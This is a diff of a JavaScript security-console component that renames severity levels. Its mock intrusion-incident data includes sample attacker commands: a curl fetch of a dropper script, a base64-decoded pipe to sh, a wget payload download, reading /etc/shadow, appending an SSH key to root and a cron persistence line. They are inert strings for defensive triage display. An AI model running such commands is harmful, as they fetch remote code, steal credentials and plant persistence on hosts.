-    const LVC = { '紧急': 'kc-lv3 r', '未受保护': 'kc-lv3 o', '可疑': 'kc-lv3 y', '提醒': 'kc-lv3 b' };
+    const LVC = { '高危': 'kc-lv3 r', '未受保护': 'kc-lv3 o', '中危': 'kc-lv3 y', '低危': 'kc-lv3 b' };
     const PEND = ['待处理', '处置中', '处置失败'];
     const GO = (p, f, x) => (e) => { if (e && e.preventDefault) e.preventDefault(); if (e && e.stopPropagation) e.stopPropagation(); /* split160 */ if (p === 'SecRisks') { const t0 = (f || {})['类型'], s0 = (f || {})['检测项']; if (t0 === '漏洞' || s0 === '漏洞检测') { p = 'SecVuln'; f = Object.assign({}, f); delete f['类型']; } else if (t0 === '基线' || t0 === '网络' || s0 === '基线检查' || s0 === '网络防火墙') p = 'SecBaseline'; }
       const sc = (this.state || {}).scope || ''; const ff = Object.assign({}, f || {}); if (p !== 'SecRiskDetail') { if (sc.indexOf('德迅服务器') === 0) ff['机房'] = '德迅服务器'; else if (sc.indexOf('其他机房') === 0) ff['机房'] = '其他机房'; }
@@ -2459,13 +2459,13 @@ class Component extends DCLogic {
       ls.isTask = tab === '修复任务'; ls.tasks = TK.map(([id, n, as, hn, pr, pc, t, op]) => ({ id, n, as, hn, pr, pc, t, op, go: ev(() => toast(op === '重试' ? '已重新下发修复任务 ' + id : '任务 ' + id + '：' + pr, 'info')) }));
       ls.tabs = TBS.map((t) => { const c = t === '修复任务' ? TK.length : rk.filter((r) => qm(r) && m(r, Object.assign({}, lf, { '状态': t }))).length;
         return { n: t, c, cls: t === tab ? 'kc-tab on' : 'kc-tab', on: t === tab, pick: ev(() => S({ lfT: Date.now(), pgT: Date.now(), lf: Object.assign({}, lf, { '状态': t }), pg: 1 })) }; });
-      const ATTR = Object.assign({ '级别': uniq(['紧急', '可疑', '提醒'].filter((v) => RK.some((r) => r.lv === v))) }, PGN === 'SecBaseline' ? { '类型': ['基线', '网络'] } : {}, { '主机': uniq([].concat.apply([], RK.map((r) => r.hs))), '机房': ['德迅服务器', '其他机房'],
+      const ATTR = Object.assign({ '级别': uniq(['高危', '中危', '低危'].filter((v) => RK.some((r) => r.lv === v))) }, PGN === 'SecBaseline' ? { '类型': ['基线', '网络'] } : {}, { '主机': uniq([].concat.apply([], RK.map((r) => r.hs))), '机房': ['德迅服务器', '其他机房'],
         '检测项': uniq(RK.map((r) => r.src)), 'AI 研判': ['已研判'], '时间': ['近 7 天'], '验证': ['已验证'] });
       picker(lf, ATTR);
       ls.chips = chipsOf(lf, '状态', { '时间': '发现时间' }); ls.hasF = ls.chips.length > 0;
       ls.clear = ev(() => S({ lfT: Date.now(), pgT: Date.now(), lf: { '状态': tab }, pg: 1, q: '' }));
       ls.q = q; ls.onQ = (e) => S({ q: e.target.value, qT: Date.now(), pg: 1, pgT: Date.now() });
-      const ORD = { '紧急': 0, '未受保护': 1, '可疑': 2, '提醒': 3 };
+      const ORD = { '高危': 0, '未受保护': 1, '中危': 2, '低危': 3 };
       const rows = rk.filter((r) => qm(r) && m(r, Object.assign({}, lf, { '状态': tab }))).sort((a, b) => ORD[a.lv] - ORD[b.lv]);
       ls.n = ls.isTask ? ls.tasks.length : rows.length; ls.empty = !ls.isTask && !rows.length; ls.has = !ls.isTask && !!rows.length;
       const pg = pager(ls.isTask ? 0 : rows.length, 10);
@@ -2495,7 +2495,7 @@ class Component extends DCLogic {
         s3: ['ip', '攻击源', '222.186.**.71', [['IP', '222.186.**.71'], ['归属', '江苏 · 电信'], ['情报', '暴力破解源']]] };
       const HOSTN = (hn) => ['host', '受害主机', (HM[hn] || {}).ip || '', [['主机', hn], ['IP', (HM[hn] || {}).ip || ''], ['客户端', ((HM[hn] || {}).ver || '') + ' · ' + ((HM[hn] || {}).on || '在线')]]];
       const INC = [
-        { id: 'INC-3201', n: 'WebShell 植入并反弹连接', lv: '紧急', h: 'web-prod-01', st0: '待研判', tm: '09:12', entry: 'WebShell 上传', first: '09:12:05', last: '09:17:44',
+        { id: 'INC-3201', n: 'WebShell 植入并反弹连接', lv: '高危', h: 'web-prod-01', st0: '待研判', tm: '09:12', entry: 'WebShell 上传', first: '09:12:05', last: '09:17:44',
           ai: ['09:17', '确认入侵', '92%', 'nginx 工作进程派生 php-fpm 写入 /tmp/shell.php，随后 bash 下载 dropper 并与 185.66.21.9 建立外联。', ['php-fpm 在 /tmp 写入可执行脚本，时间和 POST /upload 一致', 'bash 由 php-fpm 派生，命令行包含远程下载并执行', 'kworkerd 冒充内核线程名，持续连接境外 IP 并上行 38.2MB']],
           main: ['src', 'up', 'host', 'p1', 'p2', 'p3', 'p5', 'f1'], br: ['p4', 'p6'], brAt: 'p3',
           al: [['a1', '09:12:05', '上传文件', '初始访问', 'T1190 利用面向公众的应用', 'POST /upload → /tmp/shell.php 已落地', 'p2'], ['a2', '09:12:38', 'WebShell 执行命令', '执行', 'T1059.004 Unix Shell', '/bin/bash -c curl hxxp://185.x.x.x/dropper.sh', 'p3'],
@@ -2503,21 +2503,21 @@ class Component extends DCLogic {
             ['a5', '09:16:20', '异常外联', '命令控制', 'T1071 应用层协议', '与 185.66.21.9:443 建立长连接', 'p5'], ['a6', '09:17:44', '数据外传', '数据外传', 'T1041 通过 C2 通道外传', '上行 38.2MB，疑似打包 /var/www', 'p5']],
           plan: ['先隔离受害主机并终止 bash（4412）进程树，封禁 185.66.21.9；然后回溯 nginx access.log 里 /upload 接口的来源会话。',
             [['隔离主机', 'web-prod-01 · 115.231.**.12', '生产主机，隔离期间对外业务会中断'], ['终止恶意进程树', 'bash · PID 4412', ''], ['清除持久化', '*/5 * * * * /tmp/.x/kworkerd', '只终止进程的话，载荷会被计划任务再次拉起'], ['封禁 IOC', '4 个指标 · 全网下发', ''], ['隔离落地文件', '/tmp/.x/kworkerd、/tmp/shell.php', '']]], recs: [] },
-        { id: 'INC-3202', n: '可疑进程持续外联', lv: '可疑', h: 'web-prod-01', st0: '待研判', tm: '09:12', entry: '异常外联', first: '09:00:00', last: '09:03:40',
+        { id: 'INC-3202', n: '可疑进程持续外联', lv: '中危', h: 'web-prod-01', st0: '待研判', tm: '09:12', entry: '异常外联', first: '09:00:00', last: '09:03:40',
           ai: ['09:04', '高度可疑', '81%', 'kworkerd 不是内核线程，由 bash 派生后持续连接 185.66.21.9:443，3 分钟内上行 38.2MB。', ['进程名与内核线程相同，但可执行文件在 /tmp/.x 下', '外联地址命中 C2 情报', '和 INC-3201 是同一个进程，可以合并调查']],
           main: ['host', 'p3', 'p5', 'c2'], br: [], al: [['b1', '09:00:00', '异常外联', '命令控制', 'T1071 应用层协议', '与 185.66.21.9:443 建立长连接', 'p5'], ['b2', '09:03:40', '数据外传', '数据外传', 'T1041 通过 C2 通道外传', '上行 38.2MB，疑似打包 /var/www', 'p5']],
           plan: ['终止 kworkerd（4433）并封禁 185.66.21.9。这个事件和 INC-3201 来自同一条攻击链，建议一起处置。', [['终止进程', 'kworkerd · PID 4433', ''], ['封禁 IP', '185.66.21.9', ''], ['隔离落地文件', '/tmp/.x/kworkerd', '']]], recs: [] },
-        { id: 'INC-3198', n: 'SSH 暴力破解后登录', lv: '紧急', h: 'web-prod-01', st0: '待验证', tm: '07:02', entry: 'SSH 暴力破解', first: '07:02:11', last: '07:06:02',
+        { id: 'INC-3198', n: 'SSH 暴力破解后登录', lv: '高危', h: 'web-prod-01', st0: '待验证', tm: '07:02', entry: 'SSH 暴力破解', first: '07:02:11', last: '07:06:02',
           ai: ['07:07', '确认入侵', '95%', '61.177.**.20 爆破 312 次后以 deploy 登录成功，随后读取 /etc/shadow 并写入 root 的 SSH 公钥。', ['登录前 10 分钟内同一来源失败 312 次', '登录后 4 分钟内读取凭据并写入公钥，属于典型的持久化手法']],
           main: ['s2', 'p7', 'p8', 'p9'], br: ['p10', 'p11'], brAt: 'p9',
           al: [['c1', '07:02:11', 'SSH 登录成功', '初始访问', 'T1110 暴力破解', 'deploy 从 61.177.**.20 登录（此前 312 次失败）', 'p8'], ['c2', '07:05:40', '读取敏感文件', '凭据访问', 'T1003.008 /etc/shadow', 'cat /etc/shadow', 'p10'], ['c3', '07:06:02', '写入 SSH 公钥', '持久化', 'T1098.004 SSH 公钥', 'tee -a /root/.ssh/authorized_keys', 'p11']],
           plan: ['已封禁来源 IP 并清除新增公钥。建议重置 deploy 密码，并开启二次身份认证。', [['封禁 IP', '61.177.**.20', ''], ['删除新增公钥', '/root/.ssh/authorized_keys 第 3 行', ''], ['重置账号密码', 'deploy', '']]],
           recs: [{ n: '封禁 IP', tg: '61.177.**.20', r: 'ok', tm: '07:09' }, { n: '删除新增公钥', tg: '/root/.ssh/authorized_keys 第 3 行', r: 'ok', tm: '07:10' }, { n: '重置账号密码', tg: 'deploy', r: 'ok', tm: '07:12' }], vdR: 1 },
-        { id: 'INC-3205', n: '可疑编码命令执行', lv: '可疑', h: 'app-03', st0: '待研判', tm: '09:12', entry: '应用进程派生 Shell', first: '09:12:30', last: '09:12:31',
+        { id: 'INC-3205', n: '可疑编码命令执行', lv: '中危', h: 'app-03', st0: '待研判', tm: '09:12', entry: '应用进程派生 Shell', first: '09:12:30', last: '09:12:31',
           ai: ['09:13', '需要人工确认', '64%', 'Java 应用进程派生 sh，执行了一段 base64 编码的命令，解码后是从 45.13.**.8 下载脚本。', ['应用进程派生 Shell 不常见，但部分运维脚本也会这么做', '下载地址命中中置信度情报']],
           main: ['host', 'j1', 'j2', 'j3', 'x2'], br: [], al: [['d1', '09:12:30', '编码命令执行', '执行', 'T1027 混淆命令', 'echo Y3Vyb…| base64 -d | sh', 'j2'], ['d2', '09:12:31', '下载脚本', '执行', 'T1105 入口工具传输', 'curl 45.13.**.8/x.sh', 'j3']],
           plan: ['先确认这段命令是否来自运维脚本。如果不是，终止 sh（5520）并封禁 45.13.**.8。', [['终止进程树', 'sh · PID 5520', ''], ['封禁 IP', '45.13.**.8', '']]], recs: [] },
-        { id: 'INC-3190', n: 'SSH 暴力破解后登录', lv: '紧急', h: 'api-01', st0: '处置中', tm: '08:41', entry: 'SSH 暴力破解', first: '08:41:10', last: '08:43:00',
+        { id: 'INC-3190', n: 'SSH 暴力破解后登录', lv: '高危', h: 'api-01', st0: '处置中', tm: '08:41', entry: 'SSH 暴力破解', first: '08:41:10', last: '08:43:00',
           ai: ['08:44', '确认入侵', '90%', '222.186.**.71 爆破成功后以 ops 登录，下载并准备执行 /tmp/k。', ['登录后立即下载并赋予执行权限']],
           main: ['s3', 'k1', 'k2'], br: [], al: [['e1', '08:41:10', 'SSH 登录成功', '初始访问', 'T1110 暴力破解', 'ops 从 222.186.**.71 登录', 'k1'], ['e2', '08:43:00', '下载可疑文件', '执行', 'T1105 入口工具传输', 'wget -q 222.186.**.71/k -O /tmp/k', 'k2']],
           plan: ['封禁来源 IP，终止 bash（4021），删除 /tmp/k，并重置 ops 密码。', [['封禁 IP', '222.186.**.71', ''], ['终止进程', 'bash · PID 4021', ''], ['删除文件', '/tmp/k', '']]], recs: [{ n: '封禁 IP', tg: '222.186.**.71', r: 'ok', tm: '08:46' }, { n: '终止进程', tg: 'bash · PID 4021', r: 'ok', tm: '08:46' }, { n: '删除文件', tg: '/tmp/k', r: 'fail', tm: '08:47', why: '文件正被进程 4188 占用，客户端已终止该进程，可以重试' }], vdR: 1 }];
@@ -2526,7 +2526,7 @@ class Component extends DCLogic {
         if (nw && nw.id === 'INC-3206' && !INC.some((x) => x.id === 'INC-3206')) {
           OTHER.s6 = ['ip', '攻击源', '45.142.xx.xx', [['IP', '45.142.xx.xx'], ['归属', '境外 · 荷兰'], ['登录前', '1 小时内失败 312 次', 'hd-red']]];
           PRC.m1 = ['sshd', 3920, 'p7', 'root', 'sshd: root [priv]', '已签名 · Debian', '0d9e…77a1']; PRC.m2 = ['bash', 3925, 'm1', 'root', '-bash', '已签名 · Debian', '6a4f…2be0']; PRC.m3 = ['sh', 3990, 'm2', 'root', 'sh /tmp/.x', '无签名', 'b72c…5e10'];
-          INC.unshift({ id: 'INC-3206', n: '异常登录后执行可疑文件', lv: '紧急', h: 'web-prod-01', st0: '待研判', tm: '10:12', entry: '由告警升级', first: '10:12:00', last: '10:12:40',
+          INC.unshift({ id: 'INC-3206', n: '异常登录后执行可疑文件', lv: '高危', h: 'web-prod-01', st0: '待研判', tm: '10:12', entry: '由告警升级', first: '10:12:00', last: '10:12:40',
             ai: ['10:13', '确认入侵', '88%', '45.142.xx.xx 在 1 小时内尝试登录 312 次后以 root 登录成功，随后执行了 /tmp/.x。', ['登录前同一来源失败 312 次', '登录后 40 秒内执行 /tmp 下的无签名文件']],
             main: ['s6', 'host', 'm1', 'm2', 'm3'], br: [], al: [['g1', '10:12:00', '异常登录', '初始访问', 'T1078 有效账号', 'root 从 45.142.xx.xx 登录（此前失败 312 次）', 'm1'], ['g2', '10:12:40', '执行可疑文件', '执行', 'T1204 用户执行', 'sh /tmp/.x', 'm3']],
             plan: ['封禁 45.142.xx.xx，终止 sh（3990）并隔离 /tmp/.x，然后重置 root 密码。', [['封禁 IP', '45.142.xx.xx', ''], ['终止进程树', 'sh · PID 3990', ''], ['隔离落地文件', '/tmp/.x', ''], ['重置账号密码', 'root', '会断开 root 当前的远程会话']]], recs: [] }); } }
@@ -2589,11 +2589,11 @@ class Component extends DCLogic {
       ls.layC = 'hu-lay' + (qOn ? '' : ' qc');
       const lvf = st.huLv || '全部'; const qq = (st.huQq || '').trim();
       ls.qq = st.huQq || ''; ls.onQq = (e) => S({ huQq: e && e.target ? e.target.value : '' });
-      ls.lvs = ['全部', '紧急', '可疑', '提醒'].map((n) => ({ n, c: n === lvf ? 'on' : '', t: ev(() => S({ huLv: n })) }));
+      ls.lvs = ['全部', '高危', '中危', '低危'].map((n) => ({ n, c: n === lvf ? 'on' : '', t: ev(() => S({ huLv: n })) }));
       const vis = INC.filter((x) => (lvf === '全部' || x.lv === lvf) && (!qq || (x.n + x.h + (HM[x.h] || {}).ip + x.id).indexOf(qq) >= 0));
       ls.qN = vis.length; ls.qPend = pendN; ls.qHd = pendN ? pendN + ' 个待研判' : vis.length + ' 个事件'; ls.qNone = !vis.length;
       const gk = st.huG || {};
-      const LB = { '紧急': 'r', '可疑': 'o', '提醒': 'b' };
+      const LB = { '高危': 'r', '中危': 'o', '低危': 'b' };
       const firstProc = (x) => { const a0 = x.al.find((y) => PRC[y[6]]); return a0 ? a0[6] : ''; };
       const piGo = (x, proc) => GO('SecHostDetail', Object.assign({ '页签': '进程调查', '来源': '威胁狩猎 · ' + x.id, '事件': x.id }, proc && x.h === 'web-prod-01' ? { '进程': proc } : {}), x.h);
       const selRef = {};
@@ -2606,7 +2606,7 @@ class Component extends DCLogic {
       ls.railH = hostsAll.map((h2) => { const its = INC.filter((x) => x.h === h2); const pn = its.filter((x) => stOf(x) === '待研判').length; const cur = its.some((x) => x.id === incId);
         return { k: pn || '', tt: h2 + ' · ' + (pn ? pn + ' 个待研判' : '没有待研判'), c: 'hu-qd' + (pn ? ' p' : ' z') + (cur ? ' on' : ''), t: ev(() => S({ huQ: true, huI: (its.find((x) => stOf(x) === '待研判') || its[0]).id, huN: '', huH: '' })) }; });
       const s0 = stOf(inc); const alP = s0 === '待研判' ? inc.al.length : 0; const slI = slaOf(inc);
-      ls.inc = { id: inc.id, n: inc.n, lv: inc.lv, lvC: inc.lv === '紧急' ? 'kc-tag err' : inc.lv === '可疑' ? 'kc-tag warn' : 'kc-tag info', entry: inc.entry, host: hn, ip: hh.ip || '', first: inc.first, last: inc.last, st: s0, stC: STC[s0] || 'kc-tag mut', pend: alP || '', sla: slI ? slI[0] + '时限：' + slI[1] : '', slaC: 'hu-sla' + (slI && slI[2] ? ' r' : ''), slaAl: !!(slI && slI[2]), slaAlT: '响应已超时 12 分钟，已按升级规则短信通知安全负责人 张敏（紧急事件 30 分钟未研判即升级）。' + (own[inc.id] ? '' : '请先指定负责人。'),
+      ls.inc = { id: inc.id, n: inc.n, lv: inc.lv, lvC: inc.lv === '高危' ? 'kc-tag err' : inc.lv === '中危' ? 'kc-tag warn' : 'kc-tag info', entry: inc.entry, host: hn, ip: hh.ip || '', first: inc.first, last: inc.last, st: s0, stC: STC[s0] || 'kc-tag mut', pend: alP || '', sla: slI ? slI[0] + '时限：' + slI[1] : '', slaC: 'hu-sla' + (slI && slI[2] ? ' r' : ''), slaAl: !!(slI && slI[2]), slaAlT: '响应已超时 12 分钟，已按升级规则短信通知安全负责人 张敏（高危事件 30 分钟未研判即升级）。' + (own[inc.id] ? '' : '请先指定负责人。'),
         hostGo: GO('SecHostDetail', {}, hn) };
       { const ow = own[inc.id] || ''; const oo = st.huOo === inc.id;
         ls.ownN = ow || '未分配'; ls.ownC = ow ? 'kc-dd hu-ownb' : 'kc-dd hu-ownb no'; ls.ownW = oo ? 'dd-w on' : 'dd-w'; ls.ownOn = oo;
@@ -2869,17 +2869,17 @@ class Component extends DCLogic {
       const PR = (isDemo ? P0 : P0.filter((x) => ['p1', 'p7', 'p12', 'p13', 'p14'].indexOf(x[0]) >= 0))
         .map(([id, n, pid, par, sev, al, state, user, start, cmd, sig, sha]) => ({ id, n, pid, par, sev: isDemo ? sev : 'n', al: isDemo ? al : 0, state, user, start, cmd, sig, sha }));
       const PM = {}; PR.forEach((x) => { PM[x.id] = x; });
-      const EV0 = [['07:02:11', 'SSH 登录成功', 'deploy 从 61.177.**.20 登录（此前 312 次失败）', 'p8', 'SSH 暴力破解后登录', '初始访问', 'T1110 暴力破解', '紧急', 'INC-3198'],
-        ['07:05:40', '读取敏感文件', 'cat /etc/shadow', 'p10', 'SSH 暴力破解后登录', '凭据访问', 'T1003.008 /etc/shadow', '紧急', 'INC-3198'],
-        ['07:06:02', '写入 SSH 公钥', 'tee -a /root/.ssh/authorized_keys', 'p11', 'SSH 暴力破解后登录', '持久化', 'T1098.004 SSH 公钥', '紧急', 'INC-3198'],
-        ['09:00:00', '异常外联', '与 185.66.21.9:443 建立长连接', 'p5', '可疑进程持续外联', '命令控制', 'T1071 应用层协议', '可疑', 'INC-3202'],
-        ['09:03:40', '数据外传', '上行 38.2MB，疑似打包 /var/www', 'p5', '可疑进程持续外联', '数据外传', 'T1041 通过 C2 通道外传', '可疑', 'INC-3202'],
-        ['09:12:05', '上传文件', 'POST /upload → /tmp/shell.php 已落地', 'p2', 'WebShell 植入并反弹连接', '初始访问', 'T1190 利用面向公众的应用', '紧急', 'INC-3201'],
-        ['09:12:38', 'WebShell 执行命令', '/bin/bash -c curl hxxp://185.x.x.x/dropper.sh', 'p3', 'WebShell 植入并反弹连接', '执行', 'T1059.004 Unix Shell', '紧急', 'INC-3201'],
-        ['09:12:41', '下载载荷', 'curl 拉取 dropper.sh（12.4KB）', 'p4', 'WebShell 植入并反弹连接', '执行', 'T1105 入口工具传输', '紧急', 'INC-3201'],
-        ['09:13:02', '写入计划任务', '*/5 * * * * /tmp/.x/kworkerd', 'p6', 'WebShell 植入并反弹连接', '持久化', 'T1053.003 Cron', '紧急', 'INC-3201'],
-        ['09:16:20', '异常外联', '与 185.66.21.9:443 建立长连接', 'p5', 'WebShell 植入并反弹连接', '命令控制', 'T1071 应用层协议', '紧急', 'INC-3201'],
-        ['09:17:44', '数据外传', '上行 38.2MB，疑似打包 /var/www', 'p5', 'WebShell 植入并反弹连接', '数据外传', 'T1041 通过 C2 通道外传', '紧急', 'INC-3201']];
+      const EV0 = [['07:02:11', 'SSH 登录成功', 'deploy 从 61.177.**.20 登录（此前 312 次失败）', 'p8', 'SSH 暴力破解后登录', '初始访问', 'T1110 暴力破解', '高危', 'INC-3198'],
+        ['07:05:40', '读取敏感文件', 'cat /etc/shadow', 'p10', 'SSH 暴力破解后登录', '凭据访问', 'T1003.008 /etc/shadow', '高危', 'INC-3198'],
+        ['07:06:02', '写入 SSH 公钥', 'tee -a /root/.ssh/authorized_keys', 'p11', 'SSH 暴力破解后登录', '持久化', 'T1098.004 SSH 公钥', '高危', 'INC-3198'],
+        ['09:00:00', '异常外联', '与 185.66.21.9:443 建立长连接', 'p5', '可疑进程持续外联', '命令控制', 'T1071 应用层协议', '中危', 'INC-3202'],
+        ['09:03:40', '数据外传', '上行 38.2MB，疑似打包 /var/www', 'p5', '可疑进程持续外联', '数据外传', 'T1041 通过 C2 通道外传', '中危', 'INC-3202'],
+        ['09:12:05', '上传文件', 'POST /upload → /tmp/shell.php 已落地', 'p2', 'WebShell 植入并反弹连接', '初始访问', 'T1190 利用面向公众的应用', '高危', 'INC-3201'],
+        ['09:12:38', 'WebShell 执行命令', '/bin/bash -c curl hxxp://185.x.x.x/dropper.sh', 'p3', 'WebShell 植入并反弹连接', '执行', 'T1059.004 Unix Shell', '高危', 'INC-3201'],
+        ['09:12:41', '下载载荷', 'curl 拉取 dropper.sh（12.4KB）', 'p4', 'WebShell 植入并反弹连接', '执行', 'T1105 入口工具传输', '高危', 'INC-3201'],
+        ['09:13:02', '写入计划任务', '*/5 * * * * /tmp/.x/kworkerd', 'p6', 'WebShell 植入并反弹连接', '持久化', 'T1053.003 Cron', '高危', 'INC-3201'],
+        ['09:16:20', '异常外联', '与 185.66.21.9:443 建立长连接', 'p5', 'WebShell 植入并反弹连接', '命令控制', 'T1071 应用层协议', '高危', 'INC-3201'],
+        ['09:17:44', '数据外传', '上行 38.2MB，疑似打包 /var/www', 'p5', 'WebShell 植入并反弹连接', '数据外传', 'T1041 通过 C2 通道外传', '高危', 'INC-3201']];
       const EV = isDemo ? EV0.map(([t, ty, d, pr, en, stg, ak, lv, inc]) => ({ t, ty, d, pr, en, stg, ak, lv, inc })) : [];
       const kids = (id) => PR.filter((x) => x.par === id);
       const desc = (id) => { let o = []; kids(id).forEach((k) => { o.push(k.id); o = o.concat(desc(k.id)); }); return o; };
@@ -2946,7 +2946,7 @@ class Component extends DCLogic {
         go: ev(() => { S({ hdH: Object.assign({}, hs0, { [n]: 'ing' }) }); setTimeout(() => this.setState({ hdH: Object.assign({}, this.state.hdH || {}, { [n]: 'ok' }) }), 1200); }) }; });
       ls.hdOk = ls.hard.filter((r) => r.s === '已加固').length; ls.hdAll = HD.length;
       ls.reChkT = st.hdRc ? '检测中…' : '重新检测'; ls.reChk = ev(() => { if (st.hdRc) return; S({ hdRc: 1 }); setTimeout(() => { this.setState({ hdRc: 0 }); toast('加固检测完成'); }, 1200); });
-      ls.lv = ['紧急', '可疑', '提醒'].map((n) => { const c = myP.filter((r) => r.lv === n).length; return { n, c, lc: LVC[n], cls: c ? 'hd-l' : 'hd-l z', go: c ? ev(() => S({ hdt: '待处理风险', hdr: '全部' })) : ev(() => {}) }; });
+      ls.lv = ['高危', '中危', '低危'].map((n) => { const c = myP.filter((r) => r.lv === n).length; return { n, c, lc: LVC[n], cls: c ? 'hd-l' : 'hd-l z', go: c ? ev(() => S({ hdt: '待处理风险', hdr: '全部' })) : ev(() => {}) }; });
       ls.tags = [{ n: TGN[k0] || '未打标签' }].concat(h.room === '德迅服务器' ? [{ n: '德迅云' }] : []);
       ls.addTag = ev(() => toast('已打开标签设置', 'info'));
       const rec = my.filter((r) => r.d7).slice(0, 4);
@@ -3131,19 +3131,19 @@ class Component extends DCLogic {
 
     // sechome: 德迅安全卫士总览
     const SD = 'IdcServerDetail.dc.html', SL = 'IdcServers.dc.html', EYE = 'EyeRisk.dc.html', CDN = 'Main.dc.html', ATK = 'DdosInstanceDetail.dc.html', CERT = 'ScdnCerts.dc.html';
-    const AL = [['hi', '紧急', '异常登录', 'web-prod-01', '德迅安全卫士', '新发现', 'sh-st', '10:12', '处理', SD],
-      ['hi', '紧急', 'OpenSSH 远程代码执行漏洞', 'web-prod-01', '德迅安全卫士', '待修复', 'sh-st', '10:05', '修复', SD],
-      ['hi', '紧急', 'Web 高危漏洞', 'www.example.com', '德迅云眼', '待修复', 'sh-st', '09:30', '修复', EYE],
-      ['hi', '紧急', 'CC 攻击未拦截', 'shop.example.com', 'SCDN', '持续 12 分钟', 'sh-st', '10:41', '开启防护', CDN],
+    const AL = [['hi', '高危', '异常登录', 'web-prod-01', '德迅安全卫士', '新发现', 'sh-st', '10:12', '处理', SD],
+      ['hi', '高危', 'OpenSSH 远程代码执行漏洞', 'web-prod-01', '德迅安全卫士', '待修复', 'sh-st', '10:05', '修复', SD],
+      ['hi', '高危', 'Web 高危漏洞', 'www.example.com', '德迅云眼', '待修复', 'sh-st', '09:30', '修复', EYE],
+      ['hi', '高危', 'CC 攻击未拦截', 'shop.example.com', 'SCDN', '持续 12 分钟', 'sh-st', '10:41', '开启防护', CDN],
       ['un', '未受保护', '客户端已卸载', 'backup-02', '德迅安全卫士', '待处理', 'sh-st', '10-29', '重新安装', SL],
-      ['md', '可疑', 'DDoS 攻击（UDP Flood）', '高防-002', 'DDoS 高防 IP', '自动清洗中', 'sh-st', '10:24', '查看', ATK],
-      ['md', '可疑', '弱口令（3 个账号）', 'web-prod-01', '德迅安全卫士', '待修复', 'sh-st', '10:05', '处理', SD],
-      ['md', '可疑', '源站 IP 暴露', 'shop.example.com', 'SCDN', '待处理', 'sh-st', '10-29', '查看', CDN],
-      ['lo', '提醒', 'SSL 证书 12 天后到期', 'www.example.com', 'SCDN', '待处理', 'sh-st', '10-28', '续费', CERT],
-      ['lo', '提醒', '未开启 HTTPS', 'm.example.com', 'SCDN', '待处理', 'sh-st', '10-26', '开启', CDN]];
+      ['md', '中危', 'DDoS 攻击（UDP Flood）', '高防-002', 'DDoS 高防 IP', '自动清洗中', 'sh-st', '10:24', '查看', ATK],
+      ['md', '中危', '弱口令（3 个账号）', 'web-prod-01', '德迅安全卫士', '待修复', 'sh-st', '10:05', '处理', SD],
+      ['md', '中危', '源站 IP 暴露', 'shop.example.com', 'SCDN', '待处理', 'sh-st', '10-29', '查看', CDN],
+      ['lo', '低危', 'SSL 证书 12 天后到期', 'www.example.com', 'SCDN', '待处理', 'sh-st', '10-28', '续费', CERT],
+      ['lo', '低危', '未开启 HTTPS', 'm.example.com', 'SCDN', '待处理', 'sh-st', '10-26', '开启', CDN]];
     const LV = { hi: 'kc-lv3 r', un: 'kc-lv3 o', md: 'kc-lv3 y', lo: 'kc-lv3 b' };
     const atab = st.atab || '全部';
-    const ATABS = [['全部', ''], ['紧急', 'hi'], ['未受保护', 'un'], ['可疑', 'md'], ['提醒', 'lo']];
+    const ATABS = [['全部', ''], ['高危', 'hi'], ['未受保护', 'un'], ['中危', 'md'], ['低危', 'lo']];
     const akey = (ATABS.find((x) => x[0] === atab) || ATABS[0])[1];
     const plug = st.plug || {};
     const CAP = [['入侵检测', '基础', 'on', '发现入侵', 2, 1], ['漏洞检测', '基础', 'on', '待修复漏洞', 3, 2], ['基线检查', '基础', 'on', '不合规项', 5, 2], ['威胁狩猎', '基础', 'on', '可疑线索', 1, 1], ['病毒查杀', '基础', 'on', '发现病毒', 0, 0], ['AI 研判', '企业版', 'on', '已研判事件', 6, 2], ['防勒索', '基础', 'on', '拦截勒索', 0, 0], ['网页防篡改', '基础', 'on', '拦截篡改', 0, 0]];
@@ -3168,7 +3168,7 @@ class Component extends DCLogic {
       scL: ['全部主机 · 68 台', '德迅服务器 · 7 台', '其他机房接入 · 61 台'].map((n) => ({ n, cls: n === (st.scope || '全部主机 · 68 台') ? 'on' : '', pick: () => this.setState({ scope: n, scOpen: false }) })),
       pv: ['按状态', '按风险等级'].map((n) => ({ n, on: n === pv, cls: n === pv ? 'on' : '', pick: () => this.setState({ pv: n }) })),
       byRisk: pv === '按风险等级', byState: pv !== '按风险等级',
-      grades: [['E', 'g-e', '有紧急风险', '需要立即处理', 1, [['web-prod-01', SD]]], ['D', 'g-d', '有高危风险', '', 0, []], ['C', 'g-c', '有中危风险', '', 1, [['app-03', SD]]], ['B', 'g-b', '仅低危风险', '', 0, []], ['A', 'g-a', '无风险', '持续检测中', 55, []], ['—', 'g-x', '未检测', '未受保护 6 · 接入中 3 · 已停机 2', 11, [['backup-02', SL]]]].map(([l, c, n, s2, v, hs]) => ({ l, c: 'sh-gl ' + c, n, s: s2, v, hosts: hs.map(([t, href]) => ({ t, href })) })),
+      grades: [['E', 'g-e', '有高危风险', '需要立即处理', 1, [['web-prod-01', SD]]], ['D', 'g-d', '有高危风险', '', 0, []], ['C', 'g-c', '有中危风险', '', 1, [['app-03', SD]]], ['B', 'g-b', '仅低危风险', '', 0, []], ['A', 'g-a', '无风险', '持续检测中', 55, []], ['—', 'g-x', '未检测', '未受保护 6 · 接入中 3 · 已停机 2', 11, [['backup-02', SL]]]].map(([l, c, n, s2, v, hs]) => ({ l, c: 'sh-gl ' + c, n, s: s2, v, hosts: hs.map(([t, href]) => ({ t, href })) })),
       upd: rf === 'ok' ? '11-02 10:45' : '11-02 10:42',
       refT: rf === 'ing' ? '刷新中…' : '手动刷新',
       refresh: () => { if (rf === 'ing') return; this.setState({ rf: 'ing' }); setTimeout(() => this.setState({ rf: 'ok' }), 1000); },
@@ -3195,7 +3195,7 @@ class Component extends DCLogic {
       dist: [['正常', 55, 'ok', '持续检测中'], ['有风险', 2, 'err', 'web-prod-01 等'], ['未受保护', 6, 'warn', '按原因分 6 种'], ['接入中', 3, 'info', '首次检测中'], ['重装中', 0, 'mut2', ''], ['已停机', 2, 'mut', '不检测']].map(([n, v, c, s2]) => ({ n, v, s: s2, c: 'sh-' + c, lc: v ? '' : 'z', w: 'flex:' + v })),
       tabs: ATABS.map(([n, k]) => { const c = AL.filter((r) => !k || r[0] === k).length; return { n, c, on: n === atab, cls: n === atab ? 'kc-tab on' : 'kc-tab', cc: 'kc-cnt', pick: () => this.setState({ atab: n }) }; }),
       rows: AL.filter((r) => !akey || r[0] === akey).slice(0, 5).map(([g, lvT, t, a, p, st2, sc, tm, op, href]) => ({ lv: LV[g], lvT, t, a, p, st: st2, sc, tm, op, href })),
